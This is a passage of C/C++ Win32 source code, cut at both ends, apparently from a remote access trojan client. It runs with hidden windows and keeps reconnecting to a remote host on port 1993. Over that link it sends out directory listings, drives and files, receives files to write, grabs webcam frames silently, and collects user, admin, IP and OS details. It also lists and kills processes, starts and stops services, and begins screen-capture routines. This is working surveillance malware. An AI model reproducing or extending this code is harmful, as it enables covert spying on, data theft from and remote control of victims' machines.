	if(hFind == NULL)
	{
	
	}
   
   if (INVALID_HANDLE_VALUE == hFind) 
   {
	// MessageBox(NULL, "Invalid Handle (hFind)", "List Find Next File", MB_OK);
     return 1;
   } 
   
   // List all the files in the directory with some info about them.

   do
   {
      if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
      {
		  if(strcmp(ffd.cFileName, ".."))
		  {
			  sprintf(Data, "%s|%s", ffd.cFileName, "LOL");
		   FBISend(client, ffd.cFileName, LocalId, 2, 8, PACKET_FILE_MANAGER_FILE);
		  }
      }
      else
      {
		  
         filesize.LowPart = ffd.nFileSizeLow;
         filesize.HighPart = ffd.nFileSizeHigh;
		 C = 0;
		 H = 0;
		 ID3 = 0;
		 lstrcpy(Data, ffd.cFileName);

         ZeroMemory(&DataSize,20);
         wsprintf(&DataSize[0],"%d B",filesize.QuadPart);

     	 sprintf(Data, "%s|%s", ffd.cFileName, DataSize);
		 FBISend(client,Data, LocalId, 0, 3, PACKET_FILE_MANAGER_FILE);		 
		 ZeroMemory(&Data[0], sizeof(Data));
	 }

   }while (FindNextFile(hFind, &ffd) != 0);
 
   dwError = GetLastError();
   if (dwError != ERROR_NO_MORE_FILES) 
   {
   }
   if(strlen(dir) != 3)
   {
   FBISend(client, "..", LocalId, 2, 8, PACKET_FILE_MANAGER_FILE);	
   return 0;
   }
   else
   {
   FBISend(client, "Completed", LocalId, 2, 8, PACKET_FILE_MANAGER_FILE);
   }
   FindClose(hFind);
   return 0;
}


void SendDrives()
{
UINT driveType = 0;
char drive[4] = "A:\\";
char finaldrive [20] ="";

for(drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++) 
{
switch(GetDriveType(drive)) 
{
case DRIVE_REMOVABLE: // The drive has removable media
FBISend(client, drive, LocalId, 1,0, PACKET_FILE_MANAGER_DRIVE);
break;
	
case DRIVE_REMOTE: // The drive is a remote (network) drive.
FBISend(client, drive, LocalId, 3,0, PACKET_FILE_MANAGER_DRIVE);
break;
	
case DRIVE_UNKNOWN: // The drive type cannot be determined.
FBISend(client, drive, LocalId, 3,0, PACKET_FILE_MANAGER_DRIVE);
break;

case DRIVE_FIXED: // The drive has fixed media
FBISend(client, drive, LocalId, 0,0, PACKET_FILE_MANAGER_DRIVE);
break;
	
case DRIVE_CDROM: // The drive is a CD-ROM drive.
FBISend(client, drive, LocalId, 2,0, PACKET_FILE_MANAGER_DRIVE);
break;
	
case DRIVE_RAMDISK: // The drive is a RAM disk.
FBISend(client, drive, LocalId, 2,0, PACKET_FILE_MANAGER_DRIVE);
break;

default:
break;
}
}
return;
}
int ConnectL =0;
SOCKADDR_IN    RemAdress;
int FPORT = 1993;
/////////////////////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK FileWndProc(HWND hwnd,UINT Mes,WPARAM wParam,LPARAM lParam)
{
int ConRes = 0;
int Result = 0;
char * ip;
bool ConnectL = 0;
WORD wVersionRequested;
WSADATA wsaData;
PHOSTENT hostinfo;
wVersionRequested = MAKEWORD( 2, 0 );
WORD Event;
FBIPACKET DL;
switch(Mes)
	{
case WM_INITDIALOG: 
	  if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {
            if((hostinfo = gethostbyname(IP)) != NULL)
              {
              ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
              }

            WSACleanup( );
			//MessageBox(NULL, ip, "ip", MB_OK);
      }
		ShowWindow(hwnd,SW_HIDE);
		if(!ConnectL)
		{
		ConnectL = 1;

        begin:
		RemAdress.sin_family = AF_INET;
		RemAdress.sin_addr.s_addr=inet_addr(ip);
		RemAdress.sin_port = htons (1993);
		FClient = socket (AF_INET,SOCK_STREAM,0);
	    ConRes=connect (FClient, (struct sockaddr *)&RemAdress,sizeof(RemAdress));
			if (ConRes==-1)
			{
			 goto begin;
			}
			WSAAsyncSelect(FClient,hwnd,RATMSG_SOCKET,FD_READ|FD_CLOSE|FD_CONNECT);
		}
		else
		{
		break;
		}
		break;

	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lParam);
		switch(Event)
		{
		case FD_CONNECT:
			//MessageBox(NULL, "Connection", "Connected", MB_OK);
			break;
		case FD_CLOSE:
		
			WSACleanup();
			closesocket(client);
				/*ExitProcess(0);
			    EndDialog(hwnd, Event);
		    	PostQuitMessage(0);*/
			
			break;
		case FD_READ:
         recv(FClient,(char*)&DL,sizeof(FBIPACKET),0);    
		 switch (DL.PacketType)
			{
			 
		 case PACKET_FILE_MANAGER_FILE_RECV:
			 if(DOWN[DL.ID2] == NULL)
			 {
				 //MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
				 break;
			 }
			 fwrite(DL.Data, DL.ID3, 1, DOWN[DL.ID2]);
			 break;
		 case PACKET_FILE_MANAGER_FILE_C:
			 if(DOWN[DL.ID2] == NULL)
			 {
				 MessageBox(NULL, "cant find file", "FRecv.Data", MB_OK);
				 break;
			 }				
			 fclose(DOWN[DL.ID2]);
			 break;	
		 case PACKET_FILE_MANAGER_FILE_OPEN:
			 DOWN[DL.ID2] = fopen(DL.Data, "wb");
			 break;
			}
		 
		}
		
		break;
}
return 0;
}
DWORD WINAPI FILERECV(LPVOID lpParam)
{
	HWND FileWin;
    FileWin=CreateDialog(GInstance,(LPCTSTR)IDD_FILE,NULL,(DLGPROC)FileWndProc);
	ShowWindow(FileWin,SW_HIDE);
	
	MSG msg;
	while(GetMessage(&msg,FileWin,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

DWORD WINAPI SendFile(LPVOID lpParam)
{
	FileTransfer * SendFile = (FileTransfer *) lpParam;
	
	char FileName [256] = "";
	char FilePath [1024] = "";
	FILE * Down;
	int ItemIndex = SendFile->ItemIndex;
	int FileIndex = SendFile->FileID;
	strcpy(FileName, SendFile->Name);
	strcpy(FilePath, SendFile->Path);
	FBIPACKET File;
	char * Buffer;
	char Status [128] = "";
	char BufferSend [2] = "";
	int i = 0;
	int x = 0;
    for(i=0; i < strlen(FilePath)-1; i++)
		if(FilePath[i] == '\\')
		{
			FilePath[i] = '/';
		}
		    unsigned long int pos = 0;
			unsigned long int length = 0;
			unsigned long int Nsize = 0;
			unsigned long int NextSize = 0;
			char UPBUF [30] = "";
			
			Down = fopen(FilePath, "rb");
			if(Down == NULL)
			{
				sprintf(File.Data,"Failed to open %s, %s not found.", FileName);	
				File.ID3 = ItemIndex;
				File.ID = LocalId;
				File.PacketType = PACKET_FILE_MANAGER_FILE_UPDATE_WIN;
				send(FClient, (char *)&File, sizeof(FBIPACKET), 0);
				
				return 1;
			}
			else
			{
			}
			pos = ftell(Down);
			fseek(Down, 0, SEEK_END);
			length = ftell(Down);      
			fseek(Down, pos, SEEK_SET);
			
			
			NextSize = length - Nsize;
			ZeroMemory(UPBUF, sizeof(UPBUF));
			sprintf(UPBUF,"length: %d", length);			
			
			
			
			while(Nsize < length)
			{
				ZeroMemory(&File, sizeof(FBIPACKET));
				NextSize = length - Nsize;
				sprintf(File.Data,"%d Bytes / %d Bytes", Nsize, length);	
				File.ID3 = ItemIndex;
				File.ID = LocalId;
				File.PacketType = PACKET_FILE_MANAGER_FILE_UPDATE_WIN;
				
				while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
				{
					Sleep(1000);	
				}
				ZeroMemory(&File, sizeof(FBIPACKET));
				
				if(NextSize < sizeof(File.Data))
				{
					fread(File.Data, 1, NextSize, Down);

					File.ID2 = FileIndex;
					File.ID3 = NextSize;                                 
					File.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
					while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
					{
						Sleep(1000);
					}
					break;
				}
				
				fread(File.Data, 1, sizeof(File.Data), Down);

				File.ID2 = FileIndex;
				File.ID3 = sizeof(File.Data);                                 
				File.PacketType = PACKET_FILE_MANAGER_FILE_RECV;
				
				
				while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
				{
					Sleep(1000);
				}
				
				Nsize += sizeof(File.Data);
				//percent+=unit;
	}
			
			sprintf(File.Data,"Completed: %d Bytes Downloaded.",length);	
			File.ID3 = ItemIndex;
			File.ID = LocalId;
			File.PacketType = PACKET_FILE_MANAGER_FILE_UPDATE_WIN;
			
			while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
			{
				Sleep(1000);	
			}
			sprintf(Status, "%d Bytes / %d Bytes",Nsize, length);
			
			File.ID2 = FileIndex;                               
			File.PacketType = PACKET_FILE_MANAGER_FILE_C;
			while(send(FClient, (char *)&File, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
			{
				Sleep(1000);
			}

			fclose(Down);
			free(Buffer);
			
return 0;
}
/////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////
//WebCam Capture

using namespace Gdiplus;

#define capSendMessage(hWnd, uMsg, wParm, lParam) ((IsWindow(hWnd)) ? SendMessage(hWnd, uMsg, (WPARAM)(wParm), (LPARAM)(lParam)) : 0)

BOOL capWebCam(char *szFile, int nIndex, int nX, int nY, int nMsg)
{
	HWND hWndCap = capCreateCaptureWindow("CapWebCam", WS_CHILD, 0, 0, nX, nY, GetDesktopWindow(), 0);
    if(!hWndCap) return FALSE;
    
    if(!capSendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, nIndex, 0)){
        DestroyWindow(hWndCap); return FALSE;    
    }
    
    CAPDRIVERCAPS capDriverCaps;
    memset(&capDriverCaps, 0, sizeof(CAPDRIVERCAPS));
    capSendMessage(hWndCap, WM_CAP_DRIVER_GET_CAPS, sizeof(CAPDRIVERCAPS), &capDriverCaps);
    if(!capDriverCaps.fCaptureInitialized){
        DestroyWindow(hWndCap); return FALSE;
    }
    
    capSendMessage(hWndCap, WM_CAP_SET_SCALE, TRUE, 0);
    capSendMessage(hWndCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
    capSendMessage(hWndCap, WM_CAP_FILE_SAVEDIB, 0, szFile);
    capSendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DestroyWindow(hWndCap);
    
    return TRUE;
}

BOOL ConvertImage(const WCHAR *fileName, const WCHAR *outFile, const WCHAR *format, int	nQuality)
{
	GdiplusStartupInput gdiStartup;
	EncoderParameters	encParams;
	unsigned long gdiToken;
	unsigned int nCodecs = 0, nCodecSize = 0;
	GdiplusStartup(&gdiToken, &gdiStartup, NULL);
	{
		Image image(fileName);	  
		CLSID codec;
		ImageCodecInfo* iCinfo = NULL;
		GetImageEncodersSize(&nCodecs, &nCodecSize);
		iCinfo = (ImageCodecInfo*) calloc(1, nCodecSize);
		if(iCinfo == NULL)
			return FALSE;
		GetImageEncoders(nCodecs, nCodecSize, iCinfo);
		
		for(unsigned int x = 0; x < nCodecs; x++)
		{
			if(!wcscmp(iCinfo[x].MimeType, format))
			{
				codec = iCinfo[x].Clsid;
				break;
			}    
		}
		
		encParams.Count = 1;
		encParams.Parameter[0].Guid = EncoderQuality;
        encParams.Parameter[0].Type = EncoderParameterValueTypeLong;
        encParams.Parameter[0].NumberOfValues = 1;
		encParams.Parameter[0].Value = &nQuality;
		if(image.Save(outFile, &codec, &encParams) != Ok){
			free(iCinfo);
			GdiplusShutdown(gdiToken);
			return FALSE;
		}
		free(iCinfo);
	}
	GdiplusShutdown(gdiToken);
	return TRUE;
}

int GetCamIndex()
{
	char szDeviceName[80];
    char szDeviceVersion[80];
	
    for (int wIndex = 0; wIndex < 9; wIndex++)
    {
        if (capGetDriverDescription(wIndex, szDeviceName,sizeof (szDeviceName),
			szDeviceVersion, sizeof(szDeviceVersion)))
			return wIndex;
    }
	return -1;
	
}
/////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////

char ScreenResA		[512] = "";
char AdminA			[512] = "";
char ProcessorName  [512] = "";
char RAM			[512] = "";
char UserName		[512] = "";
char CompIp			[512] = "";
char OS				[512] = "";


////////////////////////////////////////////////////////////////////////////
//Screen Res
void ScreenRes()
{
   //width
   char ResultRes [20] = "";
   int x = GetSystemMetrics(SM_CXSCREEN);
   if(x == 0)
   {
    lstrcpy(ResultRes, "X Failed!");
   }
   // height
   int y = GetSystemMetrics(SM_CYSCREEN);
    if(y == 0)
   {
	lstrcpy(ResultRes, "Y Failed!");
   }
SCREENX = x;
SCREENY = y;
wsprintf(&ScreenResA[0],"%d x %d", x, y);
//lstrcpy(Head.Buf, ResultRes);
}
//////////////////////////////////////////////////////////////////////////////
//Check NT based.
bool GetOSVersion()
{
PGNSI pGNSI;
bool bOsVersionInfoEx;
bool ntOS;

OSVERSIONINFOEX osvi; SYSTEM_INFO si;
ZeroMemory(&si, sizeof(SYSTEM_INFO));
ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

if(!(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)))
{
osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
if (!GetVersionEx( (OSVERSIONINFO *) &osvi) )
return false;
}

// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.
pGNSI = (PGNSI) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");

 if(pGNSI != NULL)
 {
 pGNSI(&si);
 }
 else
 {
 GetSystemInfo(&si);
 }

switch(osvi.dwPlatformId)
{ // Test for the Windows NT or 9x product family.
   case VER_PLATFORM_WIN32_NT:
	   {
        if(osvi.dwMajorVersion == 5 || osvi.dwMajorVersion == 6) // winXP or Vista
        ntOS = true;
	   }
       break;
}

return ntOS;
}
//////////////////////////////////////////////
//Get Total Memory.
void GetTotalRAM()
{
	char Buffer [30] = "";
	MEMORYSTATUS Status;
	ZeroMemory(&Status, sizeof(Status));
	Status.dwLength = sizeof(Status);
	GlobalMemoryStatus(&Status);
	DWORD dwRAM = (DWORD)(Status.dwTotalPhys / (1024*1024));
	lstrcpy(Buffer, "");
	wsprintf(Buffer, "%d MB", dwRAM);
	lstrcpy(RAM, Buffer);
}
/////////////////////////////////////////////////
//get CPU info
void GetProcessor()
{
char  CPUkey [100] = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
char  CPUVal [100] = "ProcessorNameString";
char CPU [100] = "";
HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;
char* buf = (char*)malloc(100);

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,CPUkey,0,KEY_READ, &key1) == ERROR_SUCCESS)
{
RegQueryValueEx(key1,CPUVal, NULL, NULL, NULL, &dataSize);
realloc(buf, dataSize);

result = RegQueryValueEx(key1,CPUVal, NULL, NULL, (PBYTE)buf, &dataSize);
if(result == ERROR_SUCCESS)
{
lstrcpy(ProcessorName, buf);
}

}

RegCloseKey(key1);
Sleep(1000);
}



bool GetCompInfo(bool ntOS)
{
// holds win9x and XP info paths
	const char * KeyNT = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\";

// holds query paths
char keyNtName[6][100] = { "ProductName","CSDVersion"};

// used to hold grabbed data
char* buf = (char*)malloc(100);

HKEY key1;
DWORD type = REG_SZ; // type of data were querying, in this case, a string
DWORD dataSize; // to hold our string size of the grabbed data
int result;

// if were running under win 2k, XP or Vista
if(ntOS == true)
{

  if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,KeyNT,0,KEY_READ, &key1) == ERROR_SUCCESS)
  {

	for(int i = 0; i < 2; i++) 
	{
	RegQueryValueEx(key1,keyNtName[i], NULL, NULL, NULL, &dataSize);
	realloc(buf, dataSize);

	result = RegQueryValueEx(key1,keyNtName[i], NULL, NULL, (PBYTE)buf, &dataSize);
		if(result == ERROR_SUCCESS && i == 0)
		{
		lstrcpy(OS, buf);
		}
		else
		{
		lstrcat(OS, " / ");
		lstrcat(OS, buf); 
		}

	}

  RegCloseKey(key1);
  }
}




return true;
}

void GetUserInfo()
{
char ret[100];
char host[100];
gethostname(host, sizeof(host));


DWORD nUserName = sizeof(UserName);
GetUserName(UserName, &nUserName);

wsprintf(ret,"%s",UserName);
//lstrcpy(Head.PID, ret);
}

void GetCompName()
{
	
      WORD wVersionRequested;
      WSADATA wsaData;
      char name[255];
      char * ip;
	  char Country [30] = "";
//	  char * ServiceName;
      PHOSTENT hostinfo;
      wVersionRequested = MAKEWORD( 2, 0 );

      if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {

            if( gethostname ( name, sizeof(name)) == 0)
            {
				//(NULL, name, "name", MB_OK);
                  if((hostinfo = gethostbyname(name)) != NULL)
                  {
                        ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
                  }
            }

            WSACleanup( );
      }
///////////////////////////////////////////////////////////////////////////////////////
//
	sprintf(CompIp, "%s / %s", ip, name);
//	lstrcpy(Head.PRIORITY, Country);
    /*GetLocaleInfo(LOCALE_SYSTEM_DEFAULT,LOCALE_SENGCOUNTRY,Country,128);
     */  
}
void serverVersion()
{
//lstrcpy(Head.ParentPID, ServerVersion);
}

BOOL IsAdmin()
{
UINT i;
bool bRetval = FALSE;
BOOL bSuccess;
HANDLE hAccessToken;
UCHAR InfoBuffer[1024];
PTOKEN_GROUPS ptgGroups = (PTOKEN_GROUPS) InfoBuffer;
DWORD dwInfoBufferSize;
PSID psidAdministrators;
SID_IDENTIFIER_AUTHORITY siaNtAuthority = SECURITY_NT_AUTHORITY;
OSVERSIONINFO Info = {0};
Info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

if (GetVersionEx(&Info))
{
	if ((Info.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)&&(Info.dwMajorVersion==4))
	{
	return TRUE;
	}

}
else
{
return FALSE;
}
if (!OpenThreadToken(GetCurrentThread(),TOKEN_QUERY,TRUE,&hAccessToken))
{ 
   if (GetLastError() != ERROR_NO_TOKEN)
	{
	return FALSE;
	}

   if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hAccessToken))
   {
	return FALSE;
   }
}
bSuccess = GetTokenInformation(hAccessToken,TokenGroups,InfoBuffer, sizeof(InfoBuffer),&dwInfoBufferSize);

CloseHandle(hAccessToken);
if (!bSuccess)
{
return FALSE;
}
if (!AllocateAndInitializeSid(&siaNtAuthority,2,SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,&psidAdministrators))
{
return FALSE;
}
	for (i = 0; i < ptgGroups->GroupCount; i++) 
	{
		if (EqualSid(psidAdministrators,ptgGroups->Groups[i].Sid))
		{
		bRetval = TRUE;
		break;
		}
	}
FreeSid(psidAdministrators);
return bRetval;
}
 
int Admin()
{
char ADMIN [100] = "";
if (IsAdmin())
{
lstrcpy(AdminA, "Administrator");
} 
else
{
lstrcpy(AdminA, "Not Administrator");
}

return 0;
}

void systeminfo()
{
char Buffer [2048] = "";
int x = 0;
ScreenRes();
Admin();
GetProcessor();
GetUserInfo();
GetCompName();
bool isNT = GetOSVersion();
GetCompInfo(isNT);
GetTotalRAM();
sprintf(Buffer, "%s|%s|%s|%s|%s|%s|%s|%s", ScreenResA, AdminA, ProcessorName, CompIp, OS, UserName, ServerVersion, RAM);
FBISend(client,Buffer,LocalId, 2, 0,PACKET_USER_JOINED);
}
/////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////
////////////////////////Task manager

HWND GetFirstWindowText(char buf[],unsigned int max_out,int *text_written)
{
     HWND ret_val;
     ret_val = GetForegroundWindow();
     if(!text_written) GetWindowText(ret_val,buf,max_out);
     else *text_written = GetWindowText(ret_val,buf,max_out);
     return ret_val;
}

int GetNextWindowText(char buf[],unsigned int max_out,HWND* handle)
{
    *handle = GetNextWindow(*handle,GW_HWNDNEXT);
    return GetWindowText(*handle,buf,max_out);
}
BOOL ShowTasks(char *Text, char * Name)
{     HWND Windows = 0;
      char Data[265] = "";
      int i = 0;
     Windows = GetFirstWindowText(Data, sizeof(Data), 0);
	 Window[i] = Windows;
	 i++;
	 while(Windows)
     {
        GetNextWindowText(Data, sizeof(Data), &Windows);
        if(*Data && IsWindowVisible(Windows))
        {   
			FBISend(client, Data, LocalId, 1, 0, PACKET_TASK_MANAGER_TASKS);
		}
		else
		{
		   if(!strcmp(Data, ""))
		   {

		   }
		   else
		   {
			FBISend(client, Data, LocalId, 2, 0, PACKET_TASK_MANAGER_TASKS);
		   }
		}
		Window[i] = Windows;
		i++;
     }
	return TRUE;
}

void SendTask()
{
	int Priority = 0;
    HANDLE Snap;
    PROCESSENTRY32 proc32;
	MEMORYSTATUS Memory;
	char Temp [7] = "";
	char MainBuffer [1024] = "";
Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//take a snap of all processes
  
  if(Snap==INVALID_HANDLE_VALUE)
  {
    return;
  }
  
  proc32.dwSize=sizeof(PROCESSENTRY32); //set size of structure
  
  while((Process32Next(Snap,&proc32))==TRUE)//while we haven't reached the final process
  {
	 Priority = proc32.pcPriClassBase;

	 if(Priority > 7 && Priority < 12)
	 {
		lstrcpy(Temp, "Normal");
	 }
	 if(Priority < 7)
	 {
		lstrcpy(Temp, "Low");
	 }
	 if(Priority > 12)
	 {
	    lstrcpy(Temp, "High");
	 }
	
     wsprintf(&MainBuffer[0],"%s|%d|%d|%d|%s",proc32.szExeFile, proc32.th32ProcessID,proc32.cntThreads,proc32.th32ParentProcessID, Temp);
	 FBISend(client,MainBuffer,	LocalId, 0, 0,PACKET_TASK_MANAGER);
 //   Head.PacketType=PACKET_TASK_MANAGER;
//	Head.ID = LocalId;

	GlobalMemoryStatus(&Memory);
//	sprintf(Head.Buf, "%d", Memory.dwMemoryLoad);

	//MessageBox(NULL, Head.Buf, "Head.Buf", MB_OK);
  }
  return;
}
BOOL KillProcess(char *Process)
{
     int result;
     HANDLE hProcessSnap = 0;
	 HANDLE hProcess = 0;
	 HANDLE hSnapshot = 0;
	 PROCESSENTRY32 pe32;
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     
     pe32.dwSize = sizeof(PROCESSENTRY32);
         
     Process32First(hProcessSnap, &pe32);
         
     while(Process32Next(hProcessSnap, &pe32))
     {
        if(!strcmp(pe32.szExeFile, Process))
        {
           result = 1;
                                   
           hProcess = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
           
           if(TerminateProcess(hProcess, 0) == 0)
           {
              //MessageBox(NULL, "Terminating process failed !", "KillProcess", MB_OK | MB_ICONERROR);
           }
           
           else
           {
            
           }
        }
     }
         
     CloseHandle(hProcess);
     CloseHandle(hProcessSnap);
     
     if(result == 0)
     //MessageBox(NULL, "Process cannot be found !", "KillProcess", MB_OK | MB_ICONWARNING);
     
     result = 0;
	return TRUE;
} 

     
////////////////////////////////////////////////////////////////////////////
int enumservices()
{
char Data [1024] = "";
char compname [MAX_COMPUTERNAME_LENGTH + 1];
DWORD cbComputerName = sizeof ( compname );
GetComputerName (compname, &cbComputerName );
int ID2 = 0;
//For enumerating services with service manager
 
ENUM_SERVICE_STATUS EnService[512];
SC_HANDLE ScManager,ScService; //Handle of service manager
DWORD cbBufSize=512*sizeof(ENUM_SERVICE_STATUS); 
DWORD lpServicesReturned; 
DWORD pcbBytesNeeded; 
DWORD lpResumeHandle=0; 
 
//For querying service info
DWORD dwBytesNeeded;
LPQUERY_SERVICE_CONFIG lpqscBuf; 
 
//Open the service manager with all as desired access
ScManager = OpenSCManager(compname,NULL,SC_MANAGER_ALL_ACCESS); 
 
char szStatus[255];
char szStartType[255];
 
if(ScManager==NULL) 
{
printf("Error querying the service manager");
return 0; 
}
 
if(::EnumServicesStatus(ScManager, SERVICE_WIN32, SERVICE_STATE_ALL, EnService, cbBufSize, &pcbBytesNeeded, &lpServicesReturned, &lpResumeHandle)==0)
{
printf("Error querying the service manager");
return 0; 
}
 
for(int i=0;i< INT ( lpServicesReturned);i++) 
{
	if((ScService=::OpenService(ScManager,EnService[i].lpServiceName,SERVICE_ALL_ACCESS))==NULL)
	{
	printf("Error opening service");
	}
 
//Allocate some memory in our buffer for the actual querying
	lpqscBuf = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 4096); 
	if (lpqscBuf == NULL) 
	{
	printf("Error allocating service query");
	strcpy(szStartType,"Unknown");
	}
 
//Retrieve the configuration info
	if (! QueryServiceConfig(ScService, lpqscBuf, 4096, &dwBytesNeeded) ) 
	{
	printf("Error querying service info");
	strcpy(szStartType,"Unknown");
	}
 
//Get the current services startup type
switch(lpqscBuf->dwStartType)
{
case SERVICE_AUTO_START:
strcpy(szStartType,"Automatic"); 
break;

case SERVICE_DEMAND_START:
strcpy(szStartType,"Manual"); 
break;

case SERVICE_DISABLED :
strcpy(szStartType,"Disabled"); 
break;
}
 
//Get the services current state
switch(EnService[i].ServiceStatus.dwCurrentState)
{
case SERVICE_PAUSED: //The service is in a paused state
strcpy(szStatus,"Paused");
ID2 = 2;
break;

case SERVICE_RUNNING: // The service is running
strcpy(szStatus,"Running");
ID2 = 1;
break;

case SERVICE_STOPPED:// The service is stopped 
strcpy(szStatus,"Stopped");
ID2 = 2;
break;

case SERVICE_START_PENDING: // The service is pending start
strcpy(szStatus,"Start pending");
ID2 = 2;
break;

case SERVICE_STOP_PENDING : // The service is pending stoppage 
strcpy(szStatus,"Stop pending"); 
ID2 = 2;
break;
}
//Output the current services info to the console
sprintf(Data,"%s|%s|%s|%s", EnService[i].lpServiceName, EnService[i].lpDisplayName, szStatus, szStartType);
FBISend(client, Data, LocalId, ID2, 0, PACKET_SERVICE_MAN);

}
return 0;
}


DWORD startService(char *pServiceName)
{
  int lRetVal = 0;
  SC_HANDLE lSCManager;
  SC_HANDLE lService;
  int lFuncRetVal = 0;


  /*
   * Get a handle to the SCM database. 
   *
   */

  if ((lSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL) 
  {
    lRetVal = 1;
    goto END;
  }

 
  if ((lService = OpenService(lSCManager, pServiceName, SERVICE_ALL_ACCESS)) == NULL)
  {
    lRetVal = 2;
	goto END;
  }    

  /*
   * Attempt to start the service.
   *
   */

  if (!StartService(lService, 0, NULL))
  {
    lRetVal = 3;
	goto END;
  }


END:

  if (lSCManager)
    CloseServiceHandle(lSCManager);

  if (lService)
    CloseServiceHandle(lService);


  return(lRetVal);
}

DWORD stopService(char *pServiceName)
{
  DWORD lRetVal = 0;
  SERVICE_STATUS_PROCESS ssp;
  DWORD lwStartTime = GetTickCount();
  DWORD lBytesNeeded;
  DWORD lTimeout = 30000;
  SC_HANDLE lSCManager;
  SC_HANDLE lService;
  int lFuncRetVal = 0;



  /*
   * Get a handle to the SCM database.   
   *
   */

  if ((lSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL) 
  {
    lRetVal = 1;
	goto END;
  }

  /*
   * Get a handle to the service.  
   *
   */

  if ((lService = OpenService(lSCManager, pServiceName, SERVICE_STOP|SERVICE_QUERY_STATUS|SERVICE_ENUMERATE_DEPENDENTS)) == NULL)
  {
    lRetVal = 2; 
	goto END;
  }    


  /*
   * Make sure the service is not already stopped.
   *
   */

  if (!QueryServiceStatusEx(lService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &lBytesNeeded))
  {
    lRetVal = 3; 
    goto END;
  }

  if (ssp.dwCurrentState == SERVICE_STOPPED)
  {
    lRetVal = 4;
	goto END;
  }

  /*
   * If a stop is pending, wait for it.
   *
   */

  while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
  {
    Sleep( ssp.dwWaitHint );
    if (!QueryServiceStatusEx(lService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &lBytesNeeded))
    {
      lRetVal = 5;
      goto END;
    }

    if ( ssp.dwCurrentState == SERVICE_STOPPED )
    {
      lRetVal = 6;
      goto END;
    }


    if (GetTickCount() - lwStartTime > lTimeout)
    {
      lRetVal = 7;
      goto END;
    }
  } // while (ssp.dwCu...



  /*
   * Send a stop code to the service.
   *
   */

  if (!ControlService(lService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &ssp))
  {
    lRetVal = 8;
    goto END;
  }



END:

  if (lService) 
    CloseServiceHandle(lService); 

  if (lSCManager)
    CloseServiceHandle(lSCManager);


  return(lRetVal);
}

///////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////
using namespace Gdiplus;

int SCREENXX = 0;
int SCREENYY = 0;
HBITMAP hbmCaptureB;


#define Alloc(p,t) (t *)malloc((p)*sizeof(t))
#define For(i,n) for ((i)=0;(i)<(n);(i)++)
#define iFor(n) For (i,n)
#define jFor(n) For (j,n)


#define MAX_LOADSTRING	100
#define HIMETRIC_INCH	2540
#define MAP_LOGHIM_TO_PIX(x,ppli)   ( ((ppli)*(x) + HIMETRIC_INCH/2) / HIMETRIC_INCH )

typedef struct {
	WORD x,y;  // dimensions
	WORD l;    // bytes per scan-line (32-bit allignment)
	BYTE *b;   // bits of bitmap,3 bytes/pixel, BGR
} tWorkBMP;  // 24-bit working bitmap


void SetTHEBMIHeader (BITMAPINFO *b,short dx,short dy)
{
 b->bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
 b->bmiHeader.biWidth=dx;
 b->bmiHeader.biHeight=-dy;
 b->bmiHeader.biPlanes=1;
 b->bmiHeader.biBitCount=24;
 b->bmiHeader.biCompression=BI_RGB;
 b->bmiHeader.biSizeImage=0;
 b->bmiHeader.biXPelsPerMeter=1;
 b->bmiHeader.biYPelsPerMeter=1;
